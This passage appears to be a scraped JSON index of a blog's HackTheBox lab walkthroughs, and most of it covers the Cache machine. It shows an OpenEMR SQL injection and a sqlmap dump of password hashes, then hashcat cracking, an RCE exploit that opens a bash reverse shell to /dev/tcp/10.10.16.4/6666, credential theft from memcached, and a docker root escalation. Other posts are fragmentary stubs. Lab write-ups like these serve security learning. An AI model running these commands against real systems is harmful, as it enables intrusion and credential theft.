(10.10.10.188) Host is up (0.22s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA) | 256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA) |_ 256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Cache |_http-server-header: Apache/2.4.29 (Ubuntu) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.02 seconds Web server gobuster └─$ gobuster dir -u http://10.10.10.188/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.188/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,html,js,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 277] /index.html (Status: 200) [Size: 8193] /news.html (Status: 200) [Size: 7235] /.php (Status: 403) [Size: 277] /login.html (Status: 200) [Size: 2421] /contactus.html (Status: 200) [Size: 2539] /author.html (Status: 200) [Size: 1522] /net.html (Status: 200) [Size: 290] /javascript (Status: 301) [Size: 317] [--\u0026gt; http://10.10.10.188/javascript/] Login form return weird response If we check javascript source for that page, since there were no requests in Burp, we can the creds are hard coded We have creds ash:H@v3_fun But the page has nothing interesting -vhosts\n└─$ wfuzz -u http://cache.htb/ -H \u0026#39;Host: FUZZ.cache.htb\u0026#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 973 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://cache.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000689: 400 12 L 53 W 422 Ch \u0026#34;gc._msdcs\u0026#34; Foothold We saw a hint on author page about checking out other products For example, HMS(Hospital Management System) If we assume that it\u0026rsquo;s hosted on the same box, we could try to try hms.cache.htb and hms.htb vhosts The second one actually works It\u0026rsquo;s a OpenEMR Creds for ash don\u0026rsquo;t work Based on 2018 OpenEmr at the bottom, google shows vulnerability \u0026lt; 5.0.14 We have rce but we need credentials We also have Authentication Bypass in the list Let\u0026rsquo;s start with that There is also report which we can use to enumerate the application Visting http://hms.htb/admin.php shows that it\u0026rsquo;s a 5.0.1.3 version The Auth bypass works if registration page enabled We can visit pages that are only accessible after registration All we have to do is to visit registration page first, then the page we want to see https://www.exploit-db.com/exploits/50017 From the report we can see that there is a section 3.2 - SQL Injection in add_edit_event_user.php I\u0026rsquo;ll grab a payload from there And since this page is in the list that I can access using Auth bypass, I see the results right away http://hms.htb/portal/add_edit_event_user.php?eid=1%20AND%20EXTRACTVALUE(0,CONCAT(0x5c,VERSION())) Knowing that this page is vulnerable, I will run sqlmap after saving the request in Burp └─$ sqlmap -r sqli.req --batch \u0026lt;SNIP\u0026gt; GET parameter \u0026#39;eid\u0026#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests: --- Parameter: eid (GET) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: eid=(SELECT (CASE WHEN (6227=6227) THEN 1 ELSE (SELECT 2160 UNION SELECT 3127) END)) Type: error-based Title: MySQL \u0026gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET) Payload: eid=1 AND GTID_SUBSET(CONCAT(0x7170717871,(SELECT (ELT(7606=7606,1))),0x716b706271),7606) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: eid=1 AND (SELECT 7961 FROM (SELECT(SLEEP(5)))Ccfj) Type: UNION query Title: Generic UNION query (NULL) - 4 columns Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717871,0x47506b536867545963774f71744555566268494f6f444142574b5473584e77694f6654736f714f73,0x716b706271),NULL-- - --- \u0026lt;SNIP\u0026gt; Since we need creds, let\u0026rsquo;s dump them └─$ sqlmap -r sqli.req --batch -D openemr --tables \u0026lt;SNIP\u0026gt; [18:43:48] [INFO] fetching tables for database: \u0026#39;openemr\u0026#39; Database: openemr [234 tables] +---------------------------------------+ | array | | groups | | log | \u0026lt;SNIP\u0026gt; | users | | users_facility | | users_secure | | valueset | | voids | | x12_partners | +---------------------------------------+ \u0026lt;SNIP\u0026gt; └─$ sqlmap -r sqli.req --batch -D openemr -T users_secure --dump \u0026lt;SNIP\u0026gt; Database: openemr Table: users_secure [1 entry] +----+---------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+--------------------------------+-------------------+ | id | salt | password | username | last_update | salt_history1 | salt_history2 | password_history1 | password_history2 | +----+---------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+--------------------------------+-------------------+ | 1 | \u0026lt;blank\u0026gt; | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | \u0026lt;blank\u0026gt; | 2019-11-21 06:38:40 | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin | +----+---------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+--------------------------------+-------------------+ \u0026lt;SNIP\u0026gt; Crack it using hashcat └─$ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting \u0026lt;SNIP\u0026gt; $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.:xxxxxx \u0026lt;SNIP\u0026gt; Let\u0026rsquo;s try to get a reverse shell using RCE exploit └─$ python2.7 45161.py -u openemr_admin -p xxxxxx -c \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.4/6666 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; http://hms.htb .---. ,---. ,---. .-. .-.,---. ,---. / .-. ) | .-.\\ | .-\u0026#39; | \\| || .-\u0026#39; |\\ /|| .-.\\ | | |(_)| |-\u0026#39; )| `-. | | || `-. |(\\ / || `-\u0026#39;/ | | | | | |--\u0026#39; | .-\u0026#39; | |\\ || .-\u0026#39; (_)\\/ || ( \\ `-\u0026#39; / | | | `--.| | |)|| `--.| \\ / || |\\ \\ )---\u0026#39; /( /( __.\u0026#39;/( (_)/( __.\u0026#39;| |\\/| ||_| \\)\\ (_) (__) (__) (__) (__) \u0026#39;-\u0026#39; \u0026#39;-\u0026#39; (__) ={ P R O J E C T I N S E C U R I T Y }= Twitter : @Insecurity Site : insecurity.sh [$] Authenticating with openemr_admin:xxxxxx [$] Injecting payload User #1 We can su to ash using creds we found www-data@cache:/var/www/hms.htb/public_html/interface/main$ su - ash Password: ash@cache:~$ User #2 netstat ash@cache:~$ netstat -tulpn (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:11211 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - We have a port 11211 open, which usually belongs to memcached ash@cache:~$ ps auxww | grep 11211 memcache 974 0.0 0.0 425792 4008 ? Ssl 17:32 0:01 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid ash 3573 0.0 0.0 13136 1040 pts/0 S+ 19:07 0:00 grep --color=auto 11211 Let\u0026rsquo;s enumerate it https://book.hacktricks.xyz/network-services-pentesting/11211-memcache https://www.hackingarticles.in/penetration-testing-on-memcached-server/ ash@cache:~$ echo \u0026#34;stats items\u0026#34; | nc -vn -w 1 127.0.0.1 11211 Connection to 127.0.0.1 11211 port [tcp/*] succeeded! STAT items:1:number 5 STAT items:1:number_hot 0 STAT items:1:number_warm 0 STAT items:1:number_cold 5 STAT items:1:age_hot 0 STAT items:1:age_warm 0 STAT items:1:age 48 STAT items:1:evicted 0 STAT items:1:evicted_nonzero 0 STAT items:1:evicted_time 0 STAT items:1:outofmemory 0 STAT items:1:tailrepairs 0 STAT items:1:reclaimed 0 STAT items:1:expired_unfetched 0 STAT items:1:evicted_unfetched 0 STAT items:1:evicted_active 0 STAT items:1:crawler_reclaimed 0 STAT items:1:crawler_items_checked 52 STAT items:1:lrutail_reflocked 0 STAT items:1:moves_to_cold 485 STAT items:1:moves_to_warm 0 STAT items:1:moves_within_lru 0 STAT items:1:direct_reclaims 0 STAT items:1:hits_to_hot 0 STAT items:1:hits_to_warm 0 STAT items:1:hits_to_cold 0 STAT items:1:hits_to_temp 0 END ash@cache:~$ echo \u0026#34;stats cachedump 1 0\u0026#34; | nc -vn -w 1 127.0.0.1 11211 Connection to 127.0.0.1 11211 port [tcp/*] succeeded! ITEM link [21 b; 0 s] ITEM user [5 b; 0 s] ITEM passwd [9 b; 0 s] ITEM file [7 b; 0 s] ITEM account [9 b; 0 s] END user and passwd look interesting ash@cache:~$ echo \u0026#34;get user\u0026#34; | nc -vn -w 1 127.0.0.1 11211 Connection to 127.0.0.1 11211 port [tcp/*] succeeded! VALUE user 0 5 luffy END ash@cache:~$ echo \u0026#34;get passwd\u0026#34; | nc -vn -w 1 127.0.0.1 11211 Connection to 127.0.0.1 11211 port [tcp/*] succeeded! VALUE passwd 0 9 0n3_p1ec3 END su as luffy ash@cache:~$ su - luffy Password: luffy@cache:~$ Root luffy is in docker group luffy@cache:~$ id uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker) Let\u0026rsquo;s check if there are any containers or images luffy@cache:~$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES luffy@cache:~$ docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu latest 2ca708c1c9cc 4 years ago 64.2MB luffy@cache:~$ luffy@cache:~$ docker run -v /:/mnt -i -t ubuntu bash root@6531616deb70:/# ","date":"October 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/cache/images/cache.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/cache/","summary":"Cache Enumeration nmap └─$ nmap -Pn -p- 10.10.10.188 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-30 16:53 GMT Nmap scan report for 10.10.10.188 (10.10.10.188) Host is up (0.17s latency). Not shown: 64028 filtered tcp ports (no-response), 1505 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 91.28 seconds └─$ nmap -Pn -p22,80,2201 -sC -sV 10.","tags":["HTB","vhosts","javascript","wfuzz","openemr","searchsploit","auth-bypass","sqli","injection","sqlmap","hashcat","memcached","docker"],"title":"[HTB] Machine: Cache"},{"categories":null,"contents":"Format Enumeration nmap └─$ nmap -Pn -p- 10.10.11.213 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-30 18:41 GMT Warning: 10.10.11.213 giving up on port because retransmission cap hit (10). Nmap scan report for microblog.htb (10.10.11.213) Host is up (0.18s latency). Not shown: 63979 closed tcp ports (conn-refused), 1553 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3000/tcp open ppp Nmap done: 1 IP address (1 host up) scanned in 114.64 seconds └─$ nmap -Pn -p22,80,3000 -sC -sV 10.10.11.213 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-30 18:43 GMT Nmap scan report for microblog.htb (10.10.11.213) Host is up (0.21s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 c3:97:ce:83:7d:25:5d:5d:ed:b5:45:cd:f2:0b:05:4f (RSA) | 256 b3:aa:30:35:2b:99:7d:20:fe:b6:75:88:40:a5:17:c1 (ECDSA) |_ 256 fa:b3:7d:6e:1a:bc:d1:4b:68:ed:d6:e8:97:67:27:d7 (ED25519) 80/tcp open http nginx 1.18.0 |_http-server-header: nginx/1.18.0 |_http-title: 404 Not Found 3000/tcp open http nginx 1.18.0 |_http-title: Microblog |_http-server-header: nginx/1.18.0 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.96 seconds vhosts └─$ wfuzz -u http://microblog.htb/ -H \u0026#39;Host: FUZZ.microblog.htb\u0026#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 11 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://microblog.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000111: 200 83 L 306 W 3973 Ch \u0026#34;app\u0026#34; 000001619: 200 42 L 434 W 3731 Ch \u0026#34;sunny\u0026#34; gobuster └─$ gobuster dir -u http://microblog.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://microblog.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,txt,html,js [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== └─$ sudo vim /etc/hosts [sudo] password for kali: ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://app.microblog.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://app.microblog.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: html,js,php,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 3976] /login (Status: 301) [Size: 169] [--\u0026gt; http://app.microblog.htb/login/] /register (Status: 301) [Size: 169] [--\u0026gt; http://app.microblog.htb/register/] /logout (Status: 301) [Size: 169] [--\u0026gt; http://app.microblog.htb/logout/] └─$ gobuster dir -u http://sunny.microblog.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://sunny.microblog.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,txt,html,js [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 169] [--\u0026gt; http://sunny.microblog.htb/images/] /index.php (Status: 200) [Size: 3732] /content (Status: 301) [Size: 169] [--\u0026gt; http://sunny.microblog.htb/content/] /edit (Status: 301) [Size: 169] [--\u0026gt; http://sunny.microblog.htb/edit/] microblog.htb app.microblog.htb sunny.microblog.htb Foothold Let\u0026rsquo;s check source code User Root ","date":"October 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/format/images/format.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/format/","summary":"Format Enumeration nmap └─$ nmap -Pn -p- 10.10.11.213 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-30 18:41 GMT Warning: 10.10.11.213 giving up on port because retransmission cap hit (10). Nmap scan report for microblog.htb (10.10.11.213) Host is up (0.18s latency). Not shown: 63979 closed tcp ports (conn-refused), 1553 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3000/tcp open ppp Nmap done: 1 IP address (1 host up) scanned in 114.","tags":["HTB"],"title":"[HTB] Machine: Format"},{"categories":null,"contents":"Jewel Enumeration nmap └─$ nmap -Pn -p- 10.10.10.211 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 17:03 GMT Nmap scan report for 10.10.10.211 (10.10.10.211) Host is up (0.18s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 8000/tcp open http-alt 8080/tcp open http-proxy └─$ nmap -Pn -p22,8000,8080 -sC -sV 10.10.10.211 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 17:08 GMT Nmap scan report for 10.10.10.211 (10.10.10.211) Host is up (0.21s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA) | 256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA) |_ 256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519) 8000/tcp open http Apache httpd 2.4.38 | http-title: 10.10.10.211 Git |_Requested resource was http://10.10.10.211:8000/gitweb/ | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-generator: gitweb/2.20.1 git/2.20.1 |_http-server-header: Apache/2.4.38 (Debian) 8080/tcp open http nginx 1.14.2 (Phusion Passenger 6.0.6) |_http-title: BL0G! |_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6 Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.22 seconds Port 8000 Port 8080 gobuster └─$ gobuster dir -u http://jewel.htb:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://jewel.htb:8080/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,html,js,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /login.js (Status: 200) [Size: 1149] /login.txt (Status: 406) [Size: 0] /login (Status: 200) [Size: 2652] /articles (Status: 200) [Size: 3476] /login.html (Status: 200) [Size: 2652] /login.php (Status: 200) [Size: 2652] /articles.txt (Status: 406) [Size: 0] /articles.html (Status: 200) [Size: 3491] /articles.js (Status: 200) [Size: 1982] /articles.php (Status: 200) [Size: 3488] /users (Status: 500) [Size: 1635] /users.txt (Status: 406) [Size: 0] /users.html (Status: 500) [Size: 1635] /users.php (Status: 500) [Size: 1635] /users.js (Status: 500) [Size: 1635] /signup.html (Status: 200) [Size: 2800] /signup (Status: 200) [Size: 2800] /signup.php (Status: 200) [Size: 2800] /signup.txt (Status: 406) [Size: 0] /signup.js (Status: 200) [Size: 1297] /404 (Status: 200) [Size: 1722] /404.html (Status: 200) [Size: 1722] /robots.txt (Status: 200) [Size: 98] /500 (Status: 200) [Size: 1635] /500.html (Status: 200) [Size: 1635] /422 (Status: 200) [Size: 1705] /422.html (Status: 200) [Size: 1705] Foothold/User http://10.10.10.211:8000 contains a BLOG! repo Only Initial commit is present There we see a source code Click snapshot to download an archive Let\u0026rsquo;s start analysing └─$ ls -lha total 88K drwxrwxr-x 13 kali kali 4.0K Sep 17 2020 . drwxr-xr-x 3 kali kali 4.0K Oct 29 17:36 .. drwxrwxr-x 10 kali kali 4.0K Sep 17 2020 app -rw-rw-r-- 1 kali kali 5.4K Sep 17 2020 bd.sql drwxrwxr-x 2 kali kali 4.0K Sep 17 2020 bin drwxrwxr-x 6 kali kali 4.0K Sep 17 2020 config -rw-rw-r-- 1 kali kali 130 Sep 17 2020 config.ru drwxrwxr-x 2 kali kali 4.0K Sep 17 2020 db -rw-rw-r-- 1 kali kali 2.4K Sep 17 2020 Gemfile -rw-rw-r-- 1 kali kali 5.9K Sep 17 2020 Gemfile.lock drwxrwxr-x 4 kali kali 4.0K Sep 17 2020 lib drwxrwxr-x 2 kali kali 4.0K Sep 17 2020 log -rw-rw-r-- 1 kali kali 143 Sep 17 2020 package.json drwxrwxr-x 2 kali kali 4.0K Sep 17 2020 public -rw-rw-r-- 1 kali kali 227 Sep 17 2020 Rakefile -rw-rw-r-- 1 kali kali 374 Sep 17 2020 README.md drwxrwxr-x 2 kali kali 4.0K Sep 17 2020 storage drwxrwxr-x 9 kali kali 4.0K Sep 17 2020 test drwxrwxr-x 2 kali kali 4.0K Sep 17 2020 tmp drwxrwxr-x 2 kali kali 4.0K Sep 17 2020 vendor bd.sql file contains credentials But couldn\u0026rsquo;t crack them \u0026lt;SNIP\u0026gt; COPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin; 1 bill bill@mail.htb 2020-08-25 08:13:58.662464 2020-08-25 08:13:58.662464 $2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW 2 jennifer jennifer@mail.htb 2020-08-25 08:54:42.8483 2020-08-25 08:54:42.8483 $2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy \u0026lt;SNIP\u0026gt; Gemfile contains app information Plugins, their versions etc. └─$ cat Gemfile source \u0026#39;https://rubygems.org\u0026#39; git_source(:github) { |repo| \u0026#34;https://github.com/#{repo}.git\u0026#34; } ruby \u0026#39;2.5.5\u0026#39; # Bundle edge Rails instead: gem \u0026#39;rails\u0026#39;, github: \u0026#39;rails/rails\u0026#39; gem \u0026#39;rails\u0026#39;, \u0026#39;= 5.2.2.1\u0026#39; # Use postgresql as the database for Active Record gem \u0026#39;pg\u0026#39;, \u0026#39;\u0026gt;= 0.18\u0026#39;, \u0026#39;\u0026lt; 2.0\u0026#39; # Use Puma as the app server gem \u0026#39;puma\u0026#39;, \u0026#39;~\u0026gt; 3.11\u0026#39; # Use SCSS for stylesheets gem \u0026#39;sass-rails\u0026#39;, \u0026#39;~\u0026gt; 5.0\u0026#39; # Use Uglifier as compressor for JavaScript assets gem \u0026#39;uglifier\u0026#39;, \u0026#39;\u0026gt;= 1.3.0\u0026#39; # See https://github.com/rails/execjs#readme for more supported runtimes # gem \u0026#39;mini_racer\u0026#39;, platforms: :ruby # Use CoffeeScript for .coffee assets and views gem \u0026#39;coffee-rails\u0026#39;, \u0026#39;~\u0026gt; 4.2\u0026#39; # Turbolinks makes navigating your web application faster. Read more: https://github.com/turbolinks/turbolinks gem \u0026#39;turbolinks\u0026#39;, \u0026#39;~\u0026gt; 5\u0026#39; # Build JSON APIs with ease. Read more: https://github.com/rails/jbuilder gem \u0026#39;jbuilder\u0026#39;, \u0026#39;~\u0026gt; 2.5\u0026#39; # Use Redis adapter to run Action Cable in production gem \u0026#39;redis\u0026#39;, \u0026#39;~\u0026gt; 4.0\u0026#39; # Use ActiveModel has_secure_password gem \u0026#39;bcrypt\u0026#39;, \u0026#39;~\u0026gt; 3.1.7\u0026#39; # Use ActiveStorage variant # gem \u0026#39;mini_magick\u0026#39;, \u0026#39;~\u0026gt; 4.8\u0026#39; # Use Capistrano for deployment # gem \u0026#39;capistrano-rails\u0026#39;, group: :development # Reduces boot times through caching; required in config/boot.rb gem \u0026#39;bootsnap\u0026#39;, \u0026#39;\u0026gt;= 1.1.0\u0026#39;, require: false gem \u0026#39;jquery-rails\u0026#39;, \u0026#39;= 4.3.3\u0026#39; gem \u0026#39;bootstrap\u0026#39;, \u0026#39;~\u0026gt; 4.5.0\u0026#39; gem \u0026#39;popper_js\u0026#39;, \u0026#39;1.16.0\u0026#39; gem \u0026#39;will_paginate\u0026#39;, \u0026#39;3.3.0\u0026#39; gem \u0026#39;bootstrap-will_paginate\u0026#39;, \u0026#39;1.0.0\u0026#39; group :development, :test do # Call \u0026#39;byebug\u0026#39; anywhere in the code to stop execution and get a debugger console gem \u0026#39;byebug\u0026#39;, platforms: [:mri, :mingw, :x64_mingw] end group :development do # Access an interactive console on exception pages or by calling \u0026#39;console\u0026#39; anywhere in the code. gem \u0026#39;web-console\u0026#39;, \u0026#39;\u0026gt;= 3.3.0\u0026#39; gem \u0026#39;listen\u0026#39;, \u0026#39;\u0026gt;= 3.0.5\u0026#39;, \u0026#39;\u0026lt; 3.2\u0026#39; # Spring speeds up development by keeping your application running in the background. Read more: https://github.com/rails/spring gem \u0026#39;spring\u0026#39; gem \u0026#39;spring-watcher-listen\u0026#39;, \u0026#39;~\u0026gt; 2.0.0\u0026#39; end group :test do # Adds support for Capybara system testing and selenium driver gem \u0026#39;capybara\u0026#39;, \u0026#39;\u0026gt;= 2.15\u0026#39; gem \u0026#39;selenium-webdriver\u0026#39; # Easy installation and use of chromedriver to run system tests with Chrome gem \u0026#39;chromedriver-helper\u0026#39; end # Windows does not include zoneinfo files, so bundle the tzinfo-data gem gem \u0026#39;tzinfo-data\u0026#39;, platforms: [:mingw, :mswin, :x64_mingw, :jruby] If we visit https://rubygems.org/gems/rails/versions, we see 5.2.2.1 - March 13, 2019 So if we search for cves based on date on https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=rails We see that it\u0026rsquo;s vulnerable to deserialization attack There is a github repo With a link to google groups It states about unexpected behaviour in the MemCacheStore and RedisCacheStore where, when untrusted user input is written to the cache store using the raw: true parameter So let\u0026rsquo;s grep it └─$ grep -r \u0026#34;raw: true\u0026#34; . ./app/controllers/application_controller.rb: @current_username = cache.fetch(\u0026#34;username_#{session[:user_id]}\u0026#34;, raw: true) do ./app/controllers/users_controller.rb: @current_username = cache.fetch(\u0026#34;username_#{session[:user_id]}\u0026#34;, raw: true) {user_params[:username]} If we open the users_controller.rb, we see that the cache.fetch is used in update function \u0026lt;SNIP\u0026gt; def update @user = User.find(params[:id]) if @user \u0026amp;\u0026amp; @user == current_user cache = ActiveSupport::Cache::RedisCacheStore.new(url: \u0026#34;redis://127.0.0.1:6379/0\u0026#34;) cache.delete(\u0026#34;username_#{session[:user_id]}\u0026#34;) @current_username = cache.fetch(\u0026#34;username_#{session[:user_id]}\u0026#34;, raw: true) {user_params[:username]} if @user.update(user_params) flash[:success] = \u0026#34;Your account was updated successfully\u0026#34; redirect_to articles_path else cache.delete(\u0026#34;username_#{session[:user_id]}\u0026#34;) render \u0026#39;edit\u0026#39; end else flash[:danger] = \u0026#34;Not authorized\u0026#34; redirect_to articles_path end end private def user_params params.require(:user).permit(:username, :email, :password) end end \u0026lt;SNIP\u0026gt; So we can perform it only when we update the user But we need to create a user and create our payload Install rbenv via apt install rbenv Then we can install specific ruby version rbenv install \u0026lt;VERSION\u0026gt; https://github.com/rbenv/rbenv Root ","date":"October 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/jewel/images/jewel.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/jewel/","summary":"Jewel Enumeration nmap └─$ nmap -Pn -p- 10.10.10.211 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 17:03 GMT Nmap scan report for 10.10.10.211 (10.10.10.211) Host is up (0.18s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 8000/tcp open http-alt 8080/tcp open http-proxy └─$ nmap -Pn -p22,8000,8080 -sC -sV 10.10.10.211 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 17:08 GMT Nmap scan report for 10.","tags":["HTB"],"title":"[HTB] Machine: Jewel"},{"categories":null,"contents":"Jupiter Enumeration Nmap └─$ nmap -Pn -p- 10.10.11.216 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-30 17:44 GMT Nmap scan report for 10.10.11.216 (10.10.11.216) Host is up (0.25s latency). Not shown: 65521 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 23/tcp closed telnet 25/tcp closed smtp 80/tcp open http 110/tcp closed pop3 113/tcp closed ident 139/tcp closed netbios-ssn 143/tcp closed imap 445/tcp closed microsoft-ds 993/tcp closed imaps 1025/tcp closed NFS-or-IIS 1720/tcp closed h323q931 1723/tcp closed pptp 3389/tcp closed ms-wbt-server 5900/tcp closed vnc Nmap done: 1 IP address (1 host up) scanned in 36.41 seconds └─$ nmap -Pn 